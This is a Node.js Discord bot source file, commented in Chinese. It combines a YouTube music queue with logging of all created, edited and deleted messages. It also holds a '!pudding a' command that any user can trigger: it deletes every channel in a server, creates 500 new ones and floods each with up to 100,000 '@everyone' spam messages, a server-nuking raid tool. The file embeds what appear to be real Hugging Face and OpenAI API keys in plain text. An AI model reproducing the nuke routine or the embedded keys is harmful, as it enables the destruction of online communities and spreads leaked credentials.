const { token } = require('./config.json');
const fs = require('node:fs');
const path = require('node:path');
const { Client, Collection, Events, GatewayIntentBits } = require('discord.js');
const { joinVoiceChannel, createAudioPlayer, createAudioResource, NoSubscriberBehavior,VoiceConnectionStatus,MessageActionRow, MessageSelectMenu,AudioPlayerStatus} = require('@discordjs/voice');
const ytdl = require("@distube/ytdl-core");
const playDL = require('play-dl');
const ffmpeg = require('fluent-ffmpeg'); 
const { OpenAI } = require('openai');
const HUGGING_FACE_API_KEY = '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';
const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
const downloadDirectory = 'C:/Temp/dcbot/';  
const cacheDirectory = path.join(__dirname, 'downloads_cache'); 
const filePath = path.join(cacheDirectory, 'audio');
const openai = new OpenAI({
	apiKey: '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',  // 替換為你的 OpenAI API 金鑰
  });
ffmpeg.setFfmpegPath(ffmpegInstaller.path);
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
const player = createAudioPlayer();
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates, 
  ],
});
client.commands = new Map();


function playMusicFromQueue() {
  if (queue.length === 0) {
    return;
  }

  const { resource } = queue.shift();
  audioPlayer.play(resource);
}



function sanitizeFileName(fileName) {
  const invalidChars = /[<>:"/\\|?*]/g;
  return fileName.replace(invalidChars, '_');
}

function createDirectoriesIfNotExist(filePath) {
  const dirPath = path.dirname(filePath);
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
}

function logDeletedMessage(message) {
  const logMessage = `訊息被刪除 user id: ${message.author.username} 訊息內容: "${message.content}"\n時間: ${new Date().toLocaleString()}\n`;

 
  const serverFolder = sanitizeFileName(message.guild.name);  
  const channelFolder = sanitizeFileName(message.channel.name);  

  const logFilePath = path.join('後台', serverFolder, channelFolder, 'message_log.txt');
  createDirectoriesIfNotExist(logFilePath);

  
  fs.appendFileSync(logFilePath, logMessage);
}

function logUpdatedMessage(oldMessage, newMessage) {
  const logMessage = `訊息被修改 user id: ${oldMessage.author.username}\n修改前: "${oldMessage.content}" 修改後: "${newMessage.content}" 時間: ${new Date().toLocaleString()}\n`;


  const serverFolder = sanitizeFileName(oldMessage.guild.name);  
  const channelFolder = sanitizeFileName(oldMessage.channel.name);  

  const logFilePath = path.join('後台', serverFolder, channelFolder, 'message_log.txt');
  createDirectoriesIfNotExist(logFilePath);

  fs.appendFileSync(logFilePath, logMessage);
}

function logCreatedMessage(message) {
  const logMessage = `訊息創建 user id: ${message.author.username} 訊息內容: "${message.content}" 時間: ${new Date().toLocaleString()}\n`;

  
  const serverFolder = sanitizeFileName(message.guild.name);  
  const channelFolder = sanitizeFileName(message.channel.name);  

  const logFilePath = path.join('後台', serverFolder, channelFolder, 'message_log.txt');
  createDirectoriesIfNotExist(logFilePath);

  fs.appendFileSync(logFilePath, logMessage);
}

client.on(Events.MessageDelete, (message) => {
  if (!message.guild) return;
  logDeletedMessage(message);
});

client.on(Events.MessageUpdate, (oldMessage, newMessage) => {
  if (!oldMessage.guild || oldMessage.content === newMessage.content) return;
  logUpdatedMessage(oldMessage, newMessage);
});

client.on(Events.MessageCreate, (message) => {
  if (!message.guild) return;
  logCreatedMessage(message);
});

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

client.once('ready', async () => {
    for (const file of commandFiles) {
        const command = require(`./commands/${file}`);
        client.commands.set(command.data.name, command);

        
        if (!command.data.guild) {
            await client.application.commands.create(command.data);
        }
    }
});

client.once(Events.ClientReady, readyClient => {
	console.log(`機器人已上線 ${readyClient.user.tag}`);
});

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



let shouldStop = false;  

async function puddingC(channel) {
    try {
        for (let j = 0; j < 100000; j++) {
            if (shouldStop) return;  
            await channel.send('@everyone\nhttps://youtu.be/dQw4w9WgXcQ?si=9OlKsVGQCu943inA');
        }
        console.log(`在頻道 ${channel.name} 發送了 1000 次 @everyone`);
    } catch (error) {
        console.error(`無法在頻道 ${channel.name} 發送 @everyone:`, error);
    }
}

client.on('messageCreate', async (message) => {
    if (message.content.startsWith('!pudding a')) {
        if (shouldStop) {
            message.reply("創建頻道和發送訊息已經停止。");
            shouldStop = false;
        }

        const guild = message.guild;

        try {
            
            const channels = await guild.channels.fetch();
            for (const channel of channels.values()) {
                await channel.delete();
            }
            console.log("所有頻道已刪除");

           
            for (let i = 0; i < 500; i++) {
                if (shouldStop) {
                    console.log("停止創建頻道和發送訊息");
                    return;
                }

            
                const channelName = `嘻嘻`;
                if (!channelName || channelName.trim() === "") {
                    console.error("頻道名稱無效:", channelName);
                    continue;  
                }

             
                const newChannel = await guild.channels.create({
                    name: channelName,  
                    type: 0,  
                 
                });

             

                puddingC(newChannel);  
            }

         
        } catch (error) {
            console.error('執行過程中出現錯誤:', error);
        }
    }

    if (message.content.startsWith('!break')) {
        shouldStop = true;

    }
});








client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isChatInputCommand()) return;

	const command = interaction.client.commands.get(interaction.commandName);

	if (!command) {
		console.error(`No command matching ${interaction.commandName} was found.`);
		return;
	}

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		if (interaction.replied || interaction.deferred) {
			await interaction.followUp({ content: '無法輸出', ephemeral: true });
		} else {
			await interaction.reply({ content: '無法輸出', ephemeral: true });
		}
	}
});
client.commands = new Collection();

const foldersPath = path.join(__dirname, 'commands');
const commandFolders = fs.readdirSync(foldersPath);

for (const folder of commandFolders) {
	const commandsPath = path.join(foldersPath, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		
		if ('data' in command && 'execute' in command) {
			client.commands.set(command.data.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}

let queue = []; 
let isPlaying = false; 
let currentPlayer = null; 
let currentConnection = null; 
let voiceChannel = null; 
let timeout = null;

async function playNextSong(message) {
    if (queue.length === 0) {
        message.channel.send('佇列已經播放完畢！');
        if (currentConnection) {
            currentConnection.destroy();
        }
        isPlaying = false;
        return;
    }

    isPlaying = true;
    const { url, title } = queue.shift(); 
    const stream = ytdl(url, { filter: 'audioonly', quality: 'highestaudio' }); 
    const resource = createAudioResource(stream, { inlineVolume: true });

    currentPlayer = createAudioPlayer();
    resource.volume.setVolume(0.5);

    currentPlayer.play(resource);
    currentConnection.subscribe(currentPlayer);

    currentPlayer.on(AudioPlayerStatus.Playing, () => {
        console.log('開始播放：', title);
    });

    currentPlayer.on(AudioPlayerStatus.Idle, () => {
        if (queue.length > 0) {
            playNextSong(message); 
        } else {
            isPlaying = false;
            console.log('音樂播放完畢');
            if (currentConnection) {
                currentConnection.destroy();
            }
        }
    });

    currentPlayer.on('error', error => {
        console.error('錯誤:', error);
        message.channel.send('播放過程中發生錯誤！');
        if (currentConnection) {
            currentConnection.destroy();
        }
    });
}

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.content.startsWith('!play')) {
        const args = message.content.split(' ');
        const url = args[1];

        if (!url) {
            return message.reply('請提供 YouTube 的 URL！');
        }

        voiceChannel = message.member.voice.channel;
        if (!voiceChannel) {
            return message.reply('請先加入語音頻道！');
        }

        try {
            const info = await ytdl.getInfo(url);
            if (!info || !info.videoDetails || !info.videoDetails.title) {
                return message.reply('無法獲取有效的音樂標題！');
            }
            const title = info.videoDetails.title;

            await message.channel.send(`正在播放音樂：${title}`);
            message.channel.send('正在加入語音頻道...');

            currentConnection = joinVoiceChannel({
                channelId: voiceChannel.id,
                guildId: voiceChannel.guild.id,
                adapterCreator: voiceChannel.guild.voiceAdapterCreator,
            });

            if (queue.length >= 25) {
                queue.shift(); 
            }

            queue.push({ url, title });

            if (!isPlaying) {
                playNextSong(message);
            } else {
                message.reply(`已將音樂 "${title}" 加入佇列，將會依序播放！`);
            }

        } catch (error) {
            console.error('錯誤:', error);
            message.reply('播放時發生錯誤！');
        }
    }



    if (message.content === '!skip') {
        if (isPlaying) {
            const skippedSong = queue[0]; 
            console.log(`跳過當前音樂: ${skippedSong.title}`);
            message.channel.send(`已跳過並刪除: "${skippedSong.title}"`);

            currentPlayer.stop(); 
        } else {
            message.reply('目前沒有音樂在播放！');
        }
    }

    if (message.content === '!queue') {
        if (queue.length === 0) {
            message.reply('隊列中沒有音樂！');
        } else {
            const queueList = queue.map((song, index) => `${index + 1}. ${song.title}`).join('\n');
            message.reply(`隊列中的音樂：\n${queueList}`);
        }
    }

    if (message.content === '!leave') {
        if (currentConnection) {
            if (currentPlayer && currentPlayer.state.status === AudioPlayerStatus.Playing) {
                currentPlayer.pause(); 
            }
    
            message.reply('我退出瞜~！');
            currentConnection.destroy(); 
    
            setTimeout(() => {
                queue = []; 
                console.log('所有音樂已刪除');
            }, 2000); 
        } else {
            message.reply('我現在不在語音頻道！');
        }
    }
    
});

client.on('voiceStateUpdate', (oldState, newState) => {
    if (newState.channel && newState.channel.id === voiceChannel?.id) {
        resetLeaveTimer();
    }

    if (oldState.channel && oldState.channel.id === voiceChannel?.id && oldState.channel.members.size === 1) {
        timeout = setTimeout(() => {
            if (oldState.channel.members.size === 1 && !isPlaying) {
                console.log('1 分鐘內無人，機器人將離開語音頻道');
                if (currentConnection) {
                    currentConnection.destroy(); 
                }
                queue = []; 

                setTimeout(() => {
                    console.log('所有音樂已清除');
                }, 2000); 
            }
        }, 60000); 
    }
});


function resetLeaveTimer() {
    if (timeout) {
        clearTimeout(timeout); 
    }
    timeout = setTimeout(() => {
        if (voiceChannel.members.size === 1) {
            console.log('1 分鐘內無人，機器人將離開語音頻道');
            voiceChannel.leave();
            queue = []; 

            setTimeout(() => {
                console.log('所有音樂已清除');
            }, 2000); 
        }
    }, 60000); 
}


client.login(token);
